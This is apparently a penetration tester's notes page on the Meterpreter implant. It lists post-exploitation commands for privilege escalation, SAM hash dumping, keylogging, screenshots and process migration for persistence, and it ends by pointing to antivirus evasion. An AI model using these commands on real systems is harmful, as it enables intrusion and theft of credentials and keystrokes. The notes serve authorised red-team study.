Meterpreter is an implant and framework used in conjunction with [[Metasploit]]'s `exploit/multi/handler` handler framework. 

Some useful commands include:
```shell
getsystem # Attempt to escalate to NT AUTHORITY\SYSTEM via several common privileges and rights
hashdump # Dump hashes from the local SAM (requires SYSTEM privileges)
load # Load any of many helpful modules (kiwi O.O)
netstat # Display network adapter information
arp # Display client ARP table
shell # Drop into a native shell to use the client's command line raw. Helpful if functionality is not replicated into Meterpreter, like domain enumeration via LOLBins
upload/download # Single command to transfer files is super helpful
keyscan_start/keyscan_dump/keyscan_stop # Built-in keylogger functionality
screenshot # Check the desktop for useful information
migrate # Move your session into another binary's memory space. Useful for persistence, especially if you manage to migrate into system-critical processes, and potentially for privilege escalation.
```

Meterpreter's kiwi module includes lots of the same functionality as [[Mimikatz]] but targeted specifically at local SAM databases and Kerberos. Most of the domain-crossing and havoc-wreaking functionality is not in place. For a more full-featured impementation, use [[Sliver C2]] or upload the binary to the target machine and use it manually. 

There are also some joke commands like video chatting with the victim, playing audio recordings over the speakers, and more. 

Likely to be flagged by AV software, even with the encoders provided, so use the techniques described in [[Evasion]] to avoid detection. 
